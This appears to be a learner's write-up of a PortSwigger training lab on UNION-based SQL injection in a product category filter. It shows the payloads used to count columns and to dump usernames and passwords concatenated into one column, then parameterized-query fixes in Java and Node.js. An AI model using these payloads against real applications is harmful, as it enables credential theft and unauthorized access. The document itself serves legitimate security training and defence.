# SQL injection UNION attack, retrieving multiple values in a single column
## Goal: 
Log in to the administrator account by performing a UNION attack on a SQL injection vulnerable application and retrieving data in one column..

## Lab details
Lab: SQL injection UNION attack, retrieving multiple values in a single column

Level: Practitioner

Vulnerability Class: SQL Injection subtype: UNION-based

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

Date Completed: 24-Jul-2026

Time to Solve: 10 mins

## Vulnerability Summary
The product category filter is vulnerable to SQL injection via UNION attack because the SQL query directly concatenates untrusted user input. This vulnerability enables unauthorized retrieval of information from other database tables.

## Reconnaissance
Given that the lab identified the category filter as vulnerable to SQL injection, I performed the following reconnaissance steps:

1. Determine the number of columns to perform a UNION attack.
2. Inject a UNION SELECT query to retrieve usernames and passwords from the users table by concatenating the info in one column.

## Exploitation — Step by Step
### Step 1: Determine the number of columns.
I used a UNION-based SELECT query to identify the number of columns in the main query.

```text
Gifts'union select null, null
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL --'
```
This query returned a 200 OK response, indicating that the main query contained two columns.


### Step 2: Retrieve Usernames and Passwords
With the column count identified, I injected a `UNION SELECT` query to retrieve credentials from the `users` table, which contains `username` and `password` columns.

```text
Gifts'union select null, username||'~'||password+FROM+users --
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT null, username||'~'||password from users --'
```
This query returned a `200 OK` response, displaying the credentials of all users. I identified the administrator account credentials and used them to log in successfully.

## Tools Used
 Manual (Burp Suite Repeater)

## The Fix
Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```


## Real-World Relevance
to-do

## Connections to My Own Projects
TBD

## Takeaway
Parameterized queries are the primary defense against SQL injection because they prevent user input from altering the structure of SQL statements.